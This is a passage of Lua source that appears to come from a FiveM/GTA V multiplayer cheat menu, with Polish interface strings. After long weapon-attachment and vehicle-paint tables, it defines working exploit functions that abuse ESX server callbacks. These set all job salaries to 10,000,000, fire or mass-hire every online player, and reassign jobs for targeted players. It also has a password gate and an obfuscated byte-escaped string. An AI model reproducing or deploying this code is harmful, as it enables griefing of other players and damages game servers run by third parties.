            name = '~h~~b~-» ~w~Heavy Sniper',
            bInfAmmo = false,
            mods = {
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE'
                    },
                    {
                        name = '~h~~b~-» ~w~Advanced Scope',
                        id = 'COMPONENT_AT_SCOPE_MAX'
                    }
                }
            }
        },
        HeavySniperMkII = {
            id = 'weapon_heavysniper_mk2',
            name = '~h~~b~-» ~w~Heavy Sniper Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Incendiary Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~b~-» ~w~Armor Piercing Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~b~-» ~w~FMJ Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ'
                    },
                    {
                        name = '~h~~b~-» ~w~Explosive Rounds',
                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Zoom Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE_MK2'
                    },
                    {
                        name = '~h~~b~-» ~w~Advanced Scope',
                        id = 'COMPONENT_AT_SCOPE_MAX'
                    },
                    {
                        name = '~h~~b~-» ~w~Nigt Vision Scope',
                        id = 'COMPONENT_AT_SCOPE_NV'
                    },
                    {
                        name = '~h~~b~-» ~w~Thermal Scope',
                        id = 'COMPONENT_AT_SCOPE_THERMAL'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~b~-» ~w~Default',
                        id = 'COMPONENT_AT_SR_BARREL_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Heavy',
                        id = 'COMPONENT_AT_SR_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_SR_SUPP_03'
                    },
                    {
                        name = '~h~~b~-» ~w~Squared Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_08'
                    },
                    {
                        name = '~h~~b~-» ~w~Bell-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_09'
                    }
                }
            }
        },
        MarksmanRifle = {
            id = 'weapon_marksmanrifle',
            name = '~h~~b~-» ~w~Marksman Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {
                        name = '~h~~b~-» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        MarksmanRifleMkII = {
            id = 'weapon_marksmanrifle_mk2',
            name = '~h~~b~-» ~w~Marksman Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Tracer Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~b~-» ~w~Incendiary Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~b~-» ~w~Hollow Point Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~b~-» ~w~FMJ Rounds',
                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~b~-» ~w~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    },
                    {
                        name = '~h~~b~-» ~w~Zoom Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~b~-» ~w~Default',
                        id = 'COMPONENT_AT_MRFL_BARREL_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Heavy',
                        id = 'COMPONENT_AT_MRFL_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    },
                    {
                        name = '~h~~b~-» ~w~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~b~-» ~w~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~b~-» ~w~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~b~-» ~w~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~b~-» ~w~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~b~-» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        }
    },
    Heavy = {
        RPG = {
            id = 'weapon_rpg',
            name = '~h~~b~-» ~w~RPG',
            bInfAmmo = false,
            mods = {}
        },
        GrenadeLauncher = {
            id = 'weapon_grenadelauncher',
            name = '~h~~b~-» ~w~Grenade Launcher',
            bInfAmmo = false,
            mods = {}
        },
        GrenadeLauncherSmoke = {
            id = 'weapon_grenadelauncher_smoke',
            name = '~h~~b~-» ~w~Grenade Launcher Smoke',
            bInfAmmo = false,
            mods = {}
        },
        Minigun = {
            id = 'weapon_minigun',
            name = '~h~~b~-» ~w~Minigun',
            bInfAmmo = false,
            mods = {}
        },
        FireworkLauncher = {
            id = 'weapon_firework',
            name = '~h~~b~-» ~w~Firework Launcher',
            bInfAmmo = false,
            mods = {}
        },
        Railgun = {
            id = 'weapon_railgun',
            name = '~h~~b~-» ~w~Railgun',
            bInfAmmo = false,
            mods = {}
        },
        HomingLauncher = {
            id = 'weapon_hominglauncher',
            name = '~h~~b~-» ~w~Homing Launcher',
            bInfAmmo = false,
            mods = {}
        },
        CompactGrenadeLauncher = {
            id = 'weapon_compactlauncher',
            name = '~h~~b~-» ~w~Compact Grenade Launcher',
            bInfAmmo = false,
            mods = {}
        },
        Widowmaker = {
            id = 'weapon_rayminigun',
            name = '~h~~b~-» ~w~Widowmaker',
            bInfAmmo = false,
            mods = {}
        }
    },
    Throwables = {
        Grenade = {
            id = 'weapon_grenade',
            name = '~h~~b~-» ~w~Grenade',
            bInfAmmo = false,
            mods = {}
        },
        BZGas = {
            id = 'weapon_bzgas',
            name = '~h~~b~-» ~w~BZ Gas',
            bInfAmmo = false,
            mods = {}
        },
        MolotovCocktail = {
            id = 'weapon_molotov',
            name = '~h~~b~-» ~w~Molotov Cocktail',
            bInfAmmo = false,
            mods = {}
        },
        StickyBomb = {
            id = 'weapon_stickybomb',
            name = '~h~~b~-» ~w~Sticky Bomb',
            bInfAmmo = false,
            mods = {}
        },
        ProximityMines = {
            id = 'weapon_proxmine',
            name = '~h~~b~-» ~w~Proximity Mines',
            bInfAmmo = false,
            mods = {}
        },
        Snowballs = {
            id = 'weapon_snowball',
            name = '~h~~b~-» ~w~Snowballs',
            bInfAmmo = false,
            mods = {}
        },
        PipeBombs = {
            id = 'weapon_pipebomb',
            name = '~h~~b~-» ~w~Pipe Bombs',
            bInfAmmo = false,
            mods = {}
        },
        Baseball = {
            id = 'weapon_ball',
            name = '~h~~b~-» ~w~Baseball',
            bInfAmmo = false,
            mods = {}
        },
        TearGas = {
            id = 'weapon_smokegrenade',
            name = '~h~~b~-» ~w~Tear Gas',
            bInfAmmo = false,
            mods = {}
        },
        Flare = {
            id = 'weapon_flare',
            name = '~h~~b~-» ~w~Flare',
            bInfAmmo = false,
            mods = {}
        }
    },
    Misc = {
        Parachute = {
            id = 'gadget_parachute',
            name = '~h~~b~-» ~w~Parachute',
            bInfAmmo = false,
            mods = {}
        },
        FireExtinguisher = {
            id = 'weapon_fireextinguisher',
            name = '~h~~b~-» ~w~Fire Extinguisher',
            bInfAmmo = false,
            mods = {}
        }
    }
}
local b8 = false
local b9 = false
local ba = false
local bb = false
local bc = nil
local bd = {}
local be = {}
local bf = nil
local bg = false
local bh = -1
local bi = -1
local bj = -1
local bk = false
local bl = {
    {
        name = '~h~Spoilers',
        id = 0
    },
    {
        name = '~h~Front Bumper',
        id = 1
    },
    {
        name = '~h~Rear Bumper',
        id = 2
    },
    {
        name = '~h~Side Skirt',
        id = 3
    },
    {
        name = '~h~Exhaust',
        id = 4
    },
    {
        name = '~h~Frame',
        id = 5
    },
    {
        name = '~h~Grille',
        id = 6
    },
    {
        name = '~h~Hood',
        id = 7
    },
    {
        name = '~h~Fender',
        id = 8
    },
    {
        name = '~h~Right Fender',
        id = 9
    },
    {
        name = '~h~Roof',
        id = 10
    },
    {
        name = '~h~Vanity Plates',
        id = 25
    },
    {
        name = '~h~Trim',
        id = 27
    },
    {
        name = '~h~Ornaments',
        id = 28
    },
    {
        name = '~h~Dashboard',
        id = 29
    },
    {
        name = '~h~Dial',
        id = 30
    },
    {
        name = '~h~Door Speaker',
        id = 31
    },
    {
        name = '~h~Seats',
        id = 32
    },
    {
        name = '~h~Steering Wheel',
        id = 33
    },
    {
        name = '~h~Shifter Leavers',
        id = 34
    },
    {
        name = '~h~Plaques',
        id = 35
    },
    {
        name = '~h~Speakers',
        id = 36
    },
    {
        name = '~h~Trunk',
        id = 37
    },
    {
        name = '~h~Hydraulics',
        id = 38
    },
    {
        name = '~h~Engine Block',
        id = 39
    },
    {
        name = '~h~Air Filter',
        id = 40
    },
    {
        name = '~h~Struts',
        id = 41
    },
    {
        name = '~h~Arch Cover',
        id = 42
    },
    {
        name = '~h~Aerials',
        id = 43
    },
    {
        name = '~h~Trim 2',
        id = 44
    },
    {
        name = '~h~Tank',
        id = 45
    },
    {
        name = '~h~Windows',
        id = 46
    },
    {
        name = '~h~Livery',
        id = 48
    },
    {
        name = '~h~Horns',
        id = 14
    },
    {
        name = '~h~Wheels',
        id = 23
    },
    {
        name = '~h~Wheel Types',
        id = 'wheeltypes'
    },
    {
        name = '~h~Extras',
        id = 'extra'
    },
    {
        name = '~h~Neons',
        id = 'neon'
    },
    {
        name = '~h~Paint',
        id = 'paint'
    },
    {
        name = '~h~Headlights Color',
        id = 'headlight'
    },
    {
        name = '~h~Licence Plate',
        id = 'licence'
    }
}
local bm = {
    {
        name = '~h~~r~Engine',
        id = 11
    },
    {
        name = '~h~~w~Brakes',
        id = 12
    },
    {
        name = '~h~~g~Transmission',
        id = 13
    },
    {
        name = '~h~~y~Suspension',
        id = 15
    },
    {
        name = '~h~~w~Armor',
        id = 16
    }
}
local bn = {
    {
        name = '~h~Blue on White 2',
        id = 0
    },
    {
        name = '~h~Blue on White 3',
        id = 4
    },
    {
        name = '~h~Yellow on Blue',
        id = 2
    },
    {
        name = '~h~Yellow on Black',
        id = 1
    },
    {
        name = '~h~North Yankton',
        id = 5
    }
}
local bo = {
    {
        name = '~h~Default',
        id = -1
    },
    {
        name = '~h~White',
        id = 0
    },
    {
        name = '~h~Blue',
        id = 1
    },
    {
        name = '~h~Electric Blue',
        id = 2
    },
    {
        name = '~h~Mint Green',
        id = 3
    },
    {
        name = '~h~Lime Green',
        id = 4
    },
    {
        name = '~h~Yellow',
        id = 5
    },
    {
        name = '~h~Golden Shower',
        id = 6
    },
    {
        name = '~h~Orange',
        id = 7
    },
    {
        name = '~h~Red',
        id = 8
    },
    {
        name = '~h~Pony Pink',
        id = 9
    },
    {
        name = '~h~Hot Pink',
        id = 10
    },
    {
        name = '~h~Purple',
        id = 11
    },
    {
        name = '~h~Blacklight',
        id = 12
    }
}
local bp = {
    ['Stock Horn'] = -1,
    ['Truck Horn'] = 1,
    ['Police Horn'] = 2,
    ['Clown Horn'] = 3,
    ['Musical Horn 1'] = 4,
    ['Musical Horn 2'] = 5,
    ['Musical Horn 3'] = 6,
    ['Musical Horn 4'] = 7,
    ['Musical Horn 5'] = 8,
    ['Sad Trombone Horn'] = 9,
    ['Classical Horn 1'] = 10,
    ['Classical Horn 2'] = 11,
    ['Classical Horn 3'] = 12,
    ['Classical Horn 4'] = 13,
    ['Classical Horn 5'] = 14,
    ['Classical Horn 6'] = 15,
    ['Classical Horn 7'] = 16,
    ['Scaledo Horn'] = 17,
    ['Scalere Horn'] = 18,
    ['Salemi Horn'] = 19,
    ['Scalefa Horn'] = 20,
    ['Scalesol Horn'] = 21,
    ['Scalela Horn'] = 22,
    ['Scaleti Horn'] = 23,
    ['Scaledo Horn High'] = 24,
    ['Jazz Horn 1'] = 25,
    ['Jazz Horn 2'] = 26,
    ['Jazz Horn 3'] = 27,
    ['Jazz Loop Horn'] = 28,
    ['Starspangban Horn 1'] = 28,
    ['Starspangban Horn 2'] = 29,
    ['Starspangban Horn 3'] = 30,
    ['Starspangban Horn 4'] = 31,
    ['Classical Loop 1'] = 32,
    ['Classical Horn 8'] = 33,
    ['Classical Loop 2'] = 34
}
local bq = {
    ['White'] = {
        255,
        255,
        255
    },
    ['Blue'] = {
        0,
        0,
        255
    },
    ['Electric Blue'] = {
        0,
        150,
        255
    },
    ['Mint Green'] = {
        50,
        255,
        155
    },
    ['Lime Green'] = {
        0,
        255,
        0
    },
    ['Yellow'] = {
        255,
        255,
        0
    },
    ['Golden Shower'] = {
        204,
        204,
        0
    },
    ['Orange'] = {
        255,
        128,
        0
    },
    ['Red'] = {
        255,
        0,
        0
    },
    ['Pony Pink'] = {
        255,
        102,
        255
    },
    ['Hot Pink'] = {
        255,
        0,
        255
    },
    ['Purple'] = {
        153,
        0,
        153
    }
}
local br = {
    {
        name = '~h~Black',
        id = 0
    },
    {
        name = '~h~Carbon Black',
        id = 147
    },
    {
        name = '~h~Graphite',
        id = 1
    },
    {
        name = '~h~Anhracite Black',
        id = 11
    },
    {
        name = '~h~Black Steel',
        id = 2
    },
    {
        name = '~h~Dark Steel',
        id = 3
    },
    {
        name = '~h~Silver',
        id = 4
    },
    {
        name = '~h~Bluish Silver',
        id = 5
    },
    {
        name = '~h~Rolled Steel',
        id = 6
    },
    {
        name = '~h~Shadow Silver',
        id = 7
    },
    {
        name = '~h~Stone Silver',
        id = 8
    },
    {
        name = '~h~Midnight Silver',
        id = 9
    },
    {
        name = '~h~Cast Iron Silver',
        id = 10
    },
    {
        name = '~h~Red',
        id = 27
    },
    {
        name = '~h~Torino Red',
        id = 28
    },
    {
        name = '~h~Formula Red',
        id = 29
    },
    {
        name = '~h~Lava Red',
        id = 150
    },
    {
        name = '~h~Blaze Red',
        id = 30
    },
    {
        name = '~h~Grace Red',
        id = 31
    },
    {
        name = '~h~Garnet Red',
        id = 32
    },
    {
        name = '~h~Sunset Red',
        id = 33
    },
    {
        name = '~h~Cabernet Red',
        id = 34
    },
    {
        name = '~h~Wine Red',
        id = 143
    },
    {
        name = '~h~Candy Red',
        id = 35
    },
    {
        name = '~h~Hot Pink',
        id = 135
    },
    {
        name = '~h~Pfsiter Pink',
        id = 137
    },
    {
        name = '~h~Salmon Pink',
        id = 136
    },
    {
        name = '~h~Sunrise Orange',
        id = 36
    },
    {
        name = '~h~Orange',
        id = 38
    },
    {
        name = '~h~Bright Orange',
        id = 138
    },
    {
        name = '~h~Gold',
        id = 99
    },
    {
        name = '~h~Bronze',
        id = 90
    },
    {
        name = '~h~Yellow',
        id = 88
    },
    {
        name = '~h~Race Yellow',
        id = 89
    },
    {
        name = '~h~Dew Yellow',
        id = 91
    },
    {
        name = '~h~Dark Green',
        id = 49
    },
    {
        name = '~h~Racing Green',
        id = 50
    },
    {
        name = '~h~Sea Green',
        id = 51
    },
    {
        name = '~h~Olive Green',
        id = 52
    },
    {
        name = '~h~Bright Green',
        id = 53
    },
    {
        name = '~h~Gasoline Green',
        id = 54
    },
    {
        name = '~h~Lime Green',
        id = 92
    },
    {
        name = '~h~Midnight Blue',
        id = 141
    },
    {
        name = '~h~Galaxy Blue',
        id = 61
    },
    {
        name = '~h~Dark Blue',
        id = 62
    },
    {
        name = '~h~Saxon Blue',
        id = 63
    },
    {
        name = '~h~Blue',
        id = 64
    },
    {
        name = '~h~Mariner Blue',
        id = 65
    },
    {
        name = '~h~Harbor Blue',
        id = 66
    },
    {
        name = '~h~Diamond Blue',
        id = 67
    },
    {
        name = '~h~Surf Blue',
        id = 68
    },
    {
        name = '~h~Nautical Blue',
        id = 69
    },
    {
        name = '~h~Racing Blue',
        id = 73
    },
    {
        name = '~h~Ultra Blue',
        id = 70
    },
    {
        name = '~h~Light Blue',
        id = 74
    },
    {
        name = '~h~Chocolate Brown',
        id = 96
    },
    {
        name = '~h~Bison Brown',
        id = 101
    },
    {
        name = '~h~Creeen Brown',
        id = 95
    },
    {
        name = '~h~Feltzer Brown',
        id = 94
    },
    {
        name = '~h~Maple Brown',
        id = 97
    },
    {
        name = '~h~Beechwood Brown',
        id = 103
    },
    {
        name = '~h~Sienna Brown',
        id = 104
    },
    {
        name = '~h~Saddle Brown',
        id = 98
    },
    {
        name = '~h~Moss Brown',
        id = 100
    },
    {
        name = '~h~Woodbeech Brown',
        id = 102
    },
    {
        name = '~h~Straw Brown',
        id = 99
    },
    {
        name = '~h~Sandy Brown',
        id = 105
    },
    {
        name = '~h~Bleached Brown',
        id = 106
    },
    {
        name = '~h~Schafter Purple',
        id = 71
    },
    {
        name = '~h~Spinnaker Purple',
        id = 72
    },
    {
        name = '~h~Midnight Purple',
        id = 142
    },
    {
        name = '~h~Bright Purple',
        id = 145
    },
    {
        name = '~h~Cream',
        id = 107
    },
    {
        name = '~h~Ice White',
        id = 111
    },
    {
        name = '~h~Frost White',
        id = 112
    }
}
local bt = {
    {
        name = '~h~Black',
        id = 12
    },
    {
        name = '~h~Gray',
        id = 13
    },
    {
        name = '~h~Light Gray',
        id = 14
    },
    {
        name = '~h~Ice White',
        id = 131
    },
    {
        name = '~h~Blue',
        id = 83
    },
    {
        name = '~h~Dark Blue',
        id = 82
    },
    {
        name = '~h~Midnight Blue',
        id = 84
    },
    {
        name = '~h~Midnight Purple',
        id = 149
    },
    {
        name = '~h~Schafter Purple',
        id = 148
    },
    {
        name = '~h~Red',
        id = 39
    },
    {
        name = '~h~Dark Red',
        id = 40
    },
    {
        name = '~h~Orange',
        id = 41
    },
    {
        name = '~h~Yellow',
        id = 42
    },
    {
        name = '~h~Lime Green',
        id = 55
    },
    {
        name = '~h~Green',
        id = 128
    },
    {
        name = '~h~Forest Green',
        id = 151
    },
    {
        name = '~h~Foliage Green',
        id = 155
    },
    {
        name = '~h~Olive Darb',
        id = 152
    },
    {
        name = '~h~Dark Earth',
        id = 153
    },
    {
        name = '~h~Desert Tan',
        id = 154
    }
}
local bu = {
    {
        name = '~h~Brushed Steel',
        id = 117
    },
    {
        name = '~h~Brushed Black Steel',
        id = 118
    },
    {
        name = '~h~Brushed Aluminum',
        id = 119
    },
    {
        name = '~h~Pure Gold',
        id = 158
    },
    {
        name = '~h~Brushed Gold',
        id = 159
    }
}

if GetVehiclePedIsUsing(PlayerPedId()) then
    veh = GetVehiclePedIsUsing(PlayerPedId())
end
local bv = false
local bw = true
local bx = GetPlayerServerId(PlayerPedId(-1))
local by = GetPlayerName(bx)
av('~h~Aby odpalic - na numpadzie lub [', true)
av (' † ', true)
av ('' .. GetPlayerName(PlayerId(-1)) .. ' \75\111\99\104\97\32\83\107\97\122\101\32\105\32\75\111\71\117\83\122\75\97\10', true)
local function bz(I, x, y)
    SetTextFont(7)
    SetTextProportional(3)
    SetTextScale(0.0, 0.2)
    SetTextDropshadow(1, 0, 0, 0, 255)
    SetTextEdge(1, 150, 150, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry('STRING')
    AddTextComponentString(I)
    DrawText(x, y)
end

function pizdaSync(bA)
    local bB = GetHashKey(bA)
    pizda(bB)
    while not HasModelLoaded(bB) do
        pizda(bB)
        Citizen.Wait(0)
    end
end

function EconomyDestroySalary1()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'police',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'mecano',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'ambulance',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'realestateagent',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'cardealer',
            0,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'police',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'mecano',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'ambulance',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'realestateagent',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'cardealer',
            1,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'police',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'mecano',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'ambulance',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'realestateagent',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'cardealer',
            2,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'police',
            3,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'mecano',
            3,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'ambulance',
            3,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'realestateagent',
            3,
            10000000
        )
        ESX.TriggerServerCallback(
            'esx_society:setJobSalary',
            function()
            end,
            'cardealer',
            3,
            10000000
        )
    end
end

function UnemployedPlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    identifier = as[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'unemployed',
                        0,
                        'fire'
                    )
                end
            end
        )
    end
end

function AmbulancePlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    identifier = as[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'ambulance',
                        3,
                        'hire'
                    )
                end
            end
        )
    end
end

function PolicePlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    identifier = as[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'police',
                        4,
                        'hire'
                    )
                end
            end
        )
    end
end

local cb = 0
local function TmEM1U()
	
    if cb == 3 then
        av("~h~Nieudane , skazamenu wylaczone.")
        Citizen.Wait(5000)
        ForceSocialClubUpdate()
	
    else
        local triggerr = KeyboardInput('Wpisz haslo', '', 100)
        if triggerr == "" then
            triggerr = true
            PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            Citizen.Wait(100)
            PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            Citizen.Wait(100)
            PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
        else
            cb = cb + 1
            av('~r~~h~Zle haslo idioto.')
            PlaySoundFrontend(-1, 'MP_WAVE_COMPLETE', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
			PlaySoundFrontend(-1, 'MP_WAVE_COMPLETE', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
			PlaySoundFrontend(-1, 'MP_WAVE_COMPLETE', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
			PlaySoundFrontend(-1, 'MP_WAVE_COMPLETE', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
			PlaySoundFrontend(-1, 'MP_WAVE_COMPLETE', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
        end
    end
end

function MecanoPlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    identifier = as[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'mecano',
                        4,
                        'hire'
                    )
                end
            end
        )
    end
end

function RealEstateAgentPlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    identifier = as[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'realestateagent',
                        4,
                        'hire'
                    )
                end
            end
        )
    end
end

function TaxiPlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    identifier = as[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'taxi',
                        4,
                        'hire'
                    )
                end
            end
        )
    end
end

function CarDealerPlayers()
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    identifier = as[i].identifier
                    ESX.TriggerServerCallback(
                        'esx_society:setJob',
                        function()
                        end,
                        identifier,
                        'cardealer',
                        4,
                        'hire'
                    )
                end
            end
        )
    end
end

function UnemployedPlayer(bF)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                local bG = nil
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    if name == GetPlayerName(bF) then
                        bG = as[i].identifier
                        debugLog('found ' .. as[i].name .. ' ' .. as[i].identifier)
                    end
                    identifier = as[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bG,
                    'unemployed',
                    0,
                    'hire'
                )
            end
        )
    end
end

function CarDealerPlayer(bF)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                local bG = nil
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    if name == GetPlayerName(bF) then
                        bG = as[i].identifier
                        debugLog('found ' .. as[i].name .. ' ' .. as[i].identifier)
                    end
                    identifier = as[i].identifier
                end
                ESX.TriggerServerCallback(
                    'esx_society:setJob',
                    function()
                    end,
                    bG,
                    'cardealer',
                    3,
                    'hire'
                )
            end
        )
    end
end

function RealEstateAgentPlayer(bF)
    if ESX then
        ESX.TriggerServerCallback(
            'esx_society:getOnlinePlayers',
            function(as)
                local bG = nil
                for i = 1, #as, 1 do
                    label = as[i].name
                    value = as[i].source
                    name = as[i].name
                    if name == GetPlayerName(bF) then
                        bG = as[i].identifier
                        debugLog('found ' .. as[i].name .. ' ' .. as[i].identifier)
                    end
                    identifier = as[i].identifier
                end
                ESX.TriggerServerCallback(
